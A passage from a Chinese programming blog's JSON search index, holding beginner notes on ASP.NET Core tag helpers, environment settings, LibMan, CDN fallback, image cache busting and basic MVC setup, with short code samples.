\u003clabel asp-for=\"Address\" class=\"col-sm-2 col-form-label\" \u003e\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cselect asp-for=\"Address\" asp-items=\"Html.GetEnumSelectList\u003cAddressEnum\u003e()\" class=\"form-control\" \u003e \u003coption value=\"\"\u003e請選擇\u003c/option\u003e \u003c/select\u003e \u003cspan asp-validation-for=\"Address\" class=\"text-danger\"\u003e\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e 送出會遇到 解決方法，在Enum加個問號。 using System.ComponentModel.DataAnnotations; namespace WebApplication3.Models { public class Dog { public int Id { get; set; } [Display( Name = \"姓名\")] [Required(ErrorMessage = \"請輸入姓名\")] [MaxLength(30, ErrorMessage = \"姓名不能超過30個字\")] public string Name { get; set; } [Display(Name = \"居住地\")] public AddressEnum? Address { get; set; } } } ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:5:2","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"相關文章 c# - Show enum name value for corresponding Id in .NET Core - Stack Overflow Using ASP.NET Core to specify Which Element in a Navigation Bar Is Active | by Koen van Zeijl | Level Up Coding 這邊以前學 Laravel View 時候，我還記得他有方法可以控制 Boostrap 選單是不是當頁 selected 狀態，這邊原生沒有，但可以透過自己擴充來解決這個問題 jquery - Adding active class to menu in asp.net core? - Stack Overflow Active Class Tag Helper in ASP.NET Core | dotnetthoughts c# - Custom tag helper not working - Stack Overflow asp.net mvc - MVC with Bootstrap Navbar - Set Selected Item to Active - Stack Overflow $(document).ready(function() { $('ul.nav.navbar-nav').find('a[href=\"' + location.pathname + '\"]') .closest('li').addClass('active'); }); ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:6:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"先前介紹ASPNETCORE_ENVIRONMENT是環境變數設定應用程式環境名稱。這篇Environment Tag Helper 支持根據不同的環境載入不同的內容。Tag 屬性有分 include,exclude。 Warning 你使用的時候沒效果，需要注意載入 TagHelpers @addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers 成功的話，滑鼠移過去可以看到提示，如下圖。 失敗的話，會是這樣。 ","date":"2022-12-07","objectID":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:0:0","tags":[".netcore","environment"],"title":"Net Core Environment Tag Helper 使用筆記","uri":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"簡單範例 \u003cenvironment include=\"Development\"\u003e \u003clink href=\"~/lib/bootstrap/css/bootstrap.css\" rel=\"stylesheet\"\u003e \u003c/environment\u003e \u003cenvironment include=\"Stage,Production\"\u003e \u003clink href=\"~/lib/bootstrap/css/bootstrap.css\" rel=\"stylesheet\"\u003e \u003c/environment\u003e \u003cenvironment exclude=\"Development\"\u003e \u003clink href=\"~/lib/bootstrap/css/bootstrap.css\" rel=\"stylesheet\"\u003e \u003c/environment\u003e ","date":"2022-12-07","objectID":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:1:0","tags":[".netcore","environment"],"title":"Net Core Environment Tag Helper 使用筆記","uri":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"CDN CSS JS 連結錯誤(404)直接使用本地 CSS(神功能) 在Layout把 bootsrap 連結換掉 \u003cenvironment include=\"Development\"\u003e \u003clink href=\"~/lib/bootstrap/dist/css/bootstrap.css\" rel=\"stylesheet\"/\u003e \u003c/environment\u003e \u003cenvironment exclude=\"Development\"\u003e \u003clink rel=\"stylesheet\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\" href=\"https://sstackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" asp-fallback-href=\"~/lib/bootstrap/dist/css/bootstrap.css\" asp-fallback-test-class=\"sr-only\" asp-fallback-test-property=\"position\" asp-fallback-test-value=\"absolute\" asp-suppress-fallback-integrity=\"true\"/\u003e \u003c/environment\u003e 修改服務的環境變數，改成驗證環境 這邊你把隨便一個integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\"改掉，會出現下面倒 cdn 錯誤訊息，但css會吃到本地端。(神作) 我目前看別的程式框架沒有這種解決方案，雖然用動態程式js去解決這個問題，不知道是不是好的方式。 ","date":"2022-12-07","objectID":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:2:0","tags":[".netcore","environment"],"title":"Net Core Environment Tag Helper 使用筆記","uri":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"asp-fallback-href 原理 asp-fallback-href：href失效後的備用鏈接 asp-fallback-test-class：會生成一個meta標籤，類名就是該值。必須是href所指CSS裡擁有的類 asp-fallback-test-property：必須是href所指CSS裡擁有的類的屬性 asp-fallback-test-value：必須是href所指CSS裡擁有的類的屬性的值 asp-suppress-fallback-integrity：驗證備用鏈接所指文件完整性 參考: .net core中的asp-fallback大致原理_Acsxionian的博客-CSDN博客 ","date":"2022-12-07","objectID":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:2:1","tags":[".netcore","environment"],"title":"Net Core Environment Tag Helper 使用筆記","uri":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"彩蛋 .Net Core Razor View 變數串接寫法 asp.net mvc - Concatenating strings in Razor - Stack Overflow [十一] ASP.NET Core 中的 Taghelper_长不大的大灰狼的博客-CSDN博客 ","date":"2022-12-07","objectID":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:3:0","tags":[".netcore","environment"],"title":"Net Core Environment Tag Helper 使用筆記","uri":"/blog/posts/Net-Core-Environment-Tag-Helper-%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"LibMan 簡單是給淺入前端開發用的，假如做前後端分離應該是用不到這個的。 功能大致上有: 一個量級的管理工具 他可以從CDN下載下來 必須在VS 2017 以後版本才能下載 ","date":"2022-12-07","objectID":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/:0:0","tags":[".netcore","libman","frontend","visual studio"],"title":"Visual Studio 使用 LibMan 管理器","uri":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/"},{"categories":[".Net Core"],"content":"操作說明 在專案右鍵點選加入，在點選用戶程式庫(L)。 在程式庫(L)輸入twitter-bootstrap，會友自動提示訊息。 這邊可以選擇輸出地方，wwwroot是 .Net Core Web 靜態根路徑，這邊可以多一個lib目錄，讓你區分靜態程式。 會多出 LibMan.json設定檔案。 { \"version\": \"1.0\", \"defaultProvider\": \"cdnjs\", \"libraries\": [ { \"library\": \"twitter-bootstrap@5.1.3\", \"destination\": \"wwwroot/lib/twitter-bootstrap/\" } ] } 下圖簡單敘述 ","date":"2022-12-07","objectID":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/:1:0","tags":[".netcore","libman","frontend","visual studio"],"title":"Visual Studio 使用 LibMan 管理器","uri":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/"},{"categories":[".Net Core"],"content":"_Layout.cshtml 載入 前端css,js 編輯器輸入 _Layout.cshtml \u003clink href=\"~/lib/bootstrap/dist/css/bootstrap.min.css\" rel=\"stylesheet\" /\u003e 我看舊版本可以直接拖拉進去。新版(2022)好像不行。 Warning 好像新版都不行樣子，參考asp.net core mvc - VS 2022, I can’t drag and drop css file into a cshtml file - Stack Overflow。 更多可以看官網文件:在 Visual Studio 中搭配 ASP.NET Core 使用 LibMan | Microsoft Docs ","date":"2022-12-07","objectID":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/:2:0","tags":[".netcore","libman","frontend","visual studio"],"title":"Visual Studio 使用 LibMan 管理器","uri":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/"},{"categories":[".Net Core"],"content":"指令方式下載 相關搭配使用 LibMan CLI 搭配 ASP.NET Core | Microsoft Learn TODO: Linux 操作再回來補 ","date":"2022-12-07","objectID":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/:3:0","tags":[".netcore","libman","frontend","visual studio"],"title":"Visual Studio 使用 LibMan 管理器","uri":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/"},{"categories":[".Net Core"],"content":"相關文章 Visual Studio 2017中使用Libman管理客戶端庫 - LamondLu - 博客園 ","date":"2022-12-07","objectID":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/:4:0","tags":[".netcore","libman","frontend","visual studio"],"title":"Visual Studio 使用 LibMan 管理器","uri":"/blog/posts/Visual-Studio-%E4%BD%BF%E7%94%A8-LibMan-%E7%AE%A1%E7%90%86%E5%99%A8/"},{"categories":[".Net Core"],"content":"在設定appsetting.*.json先說明要怎麼設定測試、正式環境。這邊先做個整理。 ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:0:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"NetCore 預設環境 預設環境有 Development Staging Production ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:1:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"系統上設定環境 要如何設定 Net Core 是正式環境還是測試環境呢?這邊可以設定系統環境變數。 可以更改變數有下面: DOTNET_ENVIRONMENT ASPNETCORE_ENVIRONMENT The ASPNETCORE_ENVIRONMENT value overrides DOTNET_ENVIRONMENT. 這邊會後覆蓋前。ASPNETCORE_ENVIRONMENT覆蓋DOTNET_ENVIRONMENT。 ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:2:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"更改環境設定需要重啟程式 ASPNETCORE_ENVIRONMENT變數可以設定在執行環境(Runtime Environment)中。可以在環境變數設定ASPNETCORE_ENVIRONMENT，但更改環境變數 VS啟動時，VS需要重啟。 使用 public void Configure(IApplicationBuilder app, IWebHostEnvironment env) 的 IWebHostEnvironment 物件調用環境變數。 env.EnvironmentName()讀出當前環境名稱。 IWebHostEnvironment 介面 (Microsoft.AspNetCore.Hosting) | Microsoft Learn ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:3:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"程式調整客製環境設定 開發中常看到有以下這些環境 Development integration testing QA Test staging production 要怎麼知道看 UAT 程式呢?這邊下面會說。 ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:4:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"Controller 一般三種環境判斷 if( env.IsDevelopment()){ app.UseDeveloperExceptionPage(); }else if( env.IsStaging() || env.IsProduction() || env.IsEnvironment(\"QA\")){ app.UseExceptionHandler(\"/Error\"); } 萬用客製化環境判斷 env.IsEnvironment(\"UAT\"); ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:4:1","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"View \u003cenvironment names=\"Development,Staging\"\u003e 測試環境 \u003c/environment\u003e \u003cenvironment names=\"Production\"\u003e 正式環境 \u003c/environment\u003e Warning 你使用的時候沒效果，需要注意載入 TagHelpers @addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers 成功的話，滑鼠移過去可以看到提示，如下圖。 失敗的話，會是這樣。 相關可參考官方文件: ASP.NET Core 中的環境標籤協助程式 | Microsoft Learn Note IIS 部署需要注意，環境變數無法套用，IIS 裡面也有設定環境變數檔案。 TODO: 後續再做相關關聯筆記。 Note 這邊特別說一下，這邊環境變數可以設定appsetting.json裡的內容，大小寫沒區分。後續會介紹。 ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:4:2","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"相關文章 [.NETCore] ASP.NET Core - ENVIRONMENT 使用環境變數 ~ m@rcus 學習筆記 ASP.NET Core 6.0 所有可能用到的 ASPNETCORE_* 環境變數總整理 | The Will Will Web 在 .NET Core 主控台應用程式中使用 appsettings.json 設定檔 ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:5:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"彩蛋 [廚餘回收] Windows 工作排程器（Task Scheduler）啟動程式取得與執行檔所在相同目錄 | 軟體主廚的程式料理廚房 - 點部落 如何在 ASP.NET Core 使用 AutoMapper - HackMD ","date":"2022-12-05","objectID":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/:6:0","tags":[".netcore","env"],"title":".NET Core 設定測試、正式環境","uri":"/blog/posts/NET-Core-%E8%A8%AD%E5%AE%9A%E6%B8%AC%E8%A9%A6%E6%AD%A3%E5%BC%8F%E7%92%B0%E5%A2%83/"},{"categories":[".Net Core"],"content":"解決緩存圖片的問題。 ","date":"2022-12-05","objectID":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/:0:0","tags":["img","cache","helper","net core"],"title":".Net Core Image Helper 解決圖片 Img 緩存問題","uri":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"圖片暫存問題 首先放隨便幾張圖 Views\\Home\\Details.cshtml @using WebApplication3.Models @model IEnumerable\u003cDog\u003e @{ ViewBag.Title = \"狗的清單\"; } \u003ctable class=\"table table-dark\"\u003e \u003ctr\u003e \u003cth\u003e序號\u003c/th\u003e \u003ctd\u003e圖片\u003c/td\u003e \u003cth\u003e名稱\u003c/th\u003e \u003cth\u003e地址\u003c/th\u003e \u003ctd\u003e功能\u003c/td\u003e \u003c/tr\u003e @foreach (var dog in Model) { \u003ctr\u003e \u003ctd\u003e @dog.Id \u003c/td\u003e \u003ctd\u003e \u003cimg style=\"width:100%;\" src=\"~/img/a.jpg\"\u003e \u003c/td\u003e \u003ctd\u003e @dog.Name \u003c/td\u003e \u003ctd\u003e @dog.Address \u003c/td\u003e \u003ctd\u003e \u003ca asp-controller=\"home\" asp-action=\"details\" asp-route-id=\"@dog.Id\" class=\"btn btn-primary\" \u003e查詢\u003c/a\u003e \u003c/td\u003e \u003c/tr\u003e } \u003c/table\u003e 把a.jpg跟a1.jpg做更換，再來看程式結果。 結果還是一樣。 除非手動重新整理，就會把暫存清掉。 ","date":"2022-12-05","objectID":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/:1:0","tags":["img","cache","helper","net core"],"title":".Net Core Image Helper 解決圖片 Img 緩存問題","uri":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"解決方法(asp-append-version) img圖片上面設定asp-append-version為 true，就可以解決這個問題。 \u003cimg style=\"width:100%;\" src=\"~/img/a.jpg\" asp-append-version=\"true\"\u003e Warning 你使用的時候沒效果，需要注意載入 TagHelpers @addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers 成功的話，滑鼠移過去可以看到提示，如下圖。 失敗的話，會是這樣。 更改圖片就會改變。 這邊我很好奇css,js檔案會不會有這個問題?但結果不會，還真有趣。 ","date":"2022-12-05","objectID":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/:2:0","tags":["img","cache","helper","net core"],"title":".Net Core Image Helper 解決圖片 Img 緩存問題","uri":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"Cache 問題(補充) 這邊你用 IIS 會有這個 Cache 問題。Kestrel 是不會有這個問題，這邊你可能測試說，奇怪我還是遇到了，沒錯我也遇到了，但這個不是 Server 問題，詳細可以看我這篇(檔案下載一直抓到舊檔案的問題)，這邊我有研究出來我為什麼會抓到Cache。 可參考:循序漸進理解 HTTP Cache 機制 - Huli Warning 我這篇是實驗結果得出結論，真正 Cache 有空再研究。建議可以 Google 一下資訊，去了解 這邊其實瀏覽器都有在幫你做一層 Cache，Firefox和Chrome都有幫你做…。要怎麼排除這個問題呢?你開無痕模式就沒這個問題。 ChatGPT怎麼說 如果您不使用IIS，則不會出現靜態檔案被快取的問題。例如，如果您使用Kestrel或其他伺服器軟件來運行應用程序，則不會自動對靜態檔案進行快取。 不過，請注意，您仍然可以手動對靜態檔案進行快取。例如，如果您使用Kestrel伺服器軟件，則可以使用ASP.NET Core中的Middleware來處理靜態檔案快取。您可以在Startup類的Configure方法中添加以下代碼來實現這一點： app.UseStaticFiles(new StaticFileOptions { OnPrepareResponse = ctx =\u003e { // Set cache control header for static files ctx.Context.Response.Headers[\"Cache-Control\"] = \"public,max-age=2592000\"; } }); ","date":"2022-12-05","objectID":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/:3:0","tags":["img","cache","helper","net core"],"title":".Net Core Image Helper 解決圖片 Img 緩存問題","uri":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"彩蛋 ASP.NET Core實作API的ETag快取機制 ","date":"2022-12-05","objectID":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/:4:0","tags":["img","cache","helper","net core"],"title":".Net Core Image Helper 解決圖片 Img 緩存問題","uri":"/blog/posts/Net-Core-Image-Helper-%E8%A7%A3%E6%B1%BA%E5%9C%96%E7%89%87-img-%E7%B7%A9%E5%AD%98%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"這邊使用 .Net Core 5 版本，Net Core 6 會不太一樣，大致原理都是一致的。這邊我觀看學習教學影片邊紀錄，我覺得動手做比較容易了解問題與忽略問題地方，我那個影片有操作一些錯誤地方，不是他忘記步驟，而是當我們忘記那些步驟可以快速從那個地方找出問題解決。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:0:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"專案選擇 這邊要選擇 Web API 選項。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:1:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"Startup.cs public class Startup { public Startup(IConfiguration configuration) { Configuration = configuration; } public IConfiguration Configuration { get; } // This method gets called by the runtime. Use this method to add services to the container. public void ConfigureServices(IServiceCollection services) { services.AddControllers(); services.AddSwaggerGen(c =\u003e { c.SwaggerDoc(\"v1\", new OpenApiInfo { Title = \"WebApplication6\", Version = \"v1\" }); }); } // This method gets called by the runtime. Use this method to configure the HTTP request pipeline. public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); app.UseSwagger(); app.UseSwaggerUI(c =\u003e c.SwaggerEndpoint(\"/swagger/v1/swagger.json\", \"WebApplication6 v1\")); } app.UseHttpsRedirection(); app.UseRouting(); app.UseAuthorization(); app.UseEndpoints(endpoints =\u003e { endpoints.MapControllers(); }); } } 程式上面重點: Configure 註冊容器服務，會在這邊配置訊息。 ConfigureServices 依賴注入服務都會在這邊設定。 Tip 這邊可以看到 Startup() 注入了 IConfiguration，這邊我後續讀完覺得很奇怪，ConfigureServices() 這邊不是才註冊容器嗎?為什麼建構子就能注入，剛好查看官方文件原來能注入東西很少。 使用泛型主機 () IHostBuilder 時，只能將下列服務類型插入 Startup 建構函式： IWebHostEnvironment IHostEnvironment IConfiguration 相關連結: 點我 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:2:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":".NET Core 加入 Net Core MVC 中間件 這邊提一下中間件英文是MIddleware。 Tip 這邊我在學習 Middleware 我發現跟 Laravel Middleware 很像，回想我當初學的 Spring Boot 沒有這一層東西，但一樣還是可以做到這一層事情。沒錯，是 AOP。所以Spring Boot 不需要有 Middleware 這一個東西。 相關連結: Spring Boot AOP 小記 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:3:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"MVC 加入到 asp.net core 依賴注入容器中 public void ConfigureServices(IServiceCollection services) { services.AddMvc(); } 但是新版，上面可能要做變更，參考從 ASP.NET Core 2.2 移轉至 3.0 | Microsoft Docs文章。 這邊我用 .Net Core 5 public void ConfigureServices(IServiceCollection services) { services.AddMvc(options =\u003e options.EnableEndpointRouting = false); } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:3:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"設定中間件 public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } else { app.UseExceptionHandler(\"/Error\"); } app.UseStaticFiles(); app.UseMvcWithDefaultRoute(); app.Run(async (context) =\u003e { await context.Response.WriteAsync(\"Hello world\"); }); 從 ASP.NET Core 2.2 移轉至 3.0 | Microsoft Docs ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:3:2","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"addMvc 和 addMvcCore addMvcCore: 只包含MVC功能。所以Controller 用到JSON 回傳會錯誤。 public void ConfigureServices(IServiceCollection services) { services.AddMvc(); } addMvc: 包含MVC Core和相關第三方常用服務方法。 public void ConfigureServices(IServiceCollection services) { services.AddMvcCore(); } 簡單說，addMvc中間件比addMvcCore中間件功能還多，這邊剛入門的可以先不用太在意這邊。我後面有篇筆記有紀錄這兩種不太一樣東西。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:4:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"建立 Controller 在專案建立 Controllers，建立HomeController using Microsoft.AspNetCore.Mvc; namespace WebApplication3.Controllers { public class HomeController : Controller { public IActionResult Index() { return Json(new { a = \"1\", b = \"2\" }); } } } 所有 API 可以回傳 IActionResult，這邊其實有很多物件繼承這個。他可以針對不同類型去做回傳。我網路上有找到繼承圖片。 參考:Action results in ASP.NET CORE APIs Tip 我目前工作常用到的有IActionResult、IJSONResult、FileResult等等。這邊你可以寫的很死，也可以放你新增的類別也可以，我目前我的專案是這樣用，當人也可以這樣寫ActionResult\u003c你的Class\u003e，但我目前不知道直接這樣寫的好處?跟強制直接寫你的Class這樣的好處在哪? Question 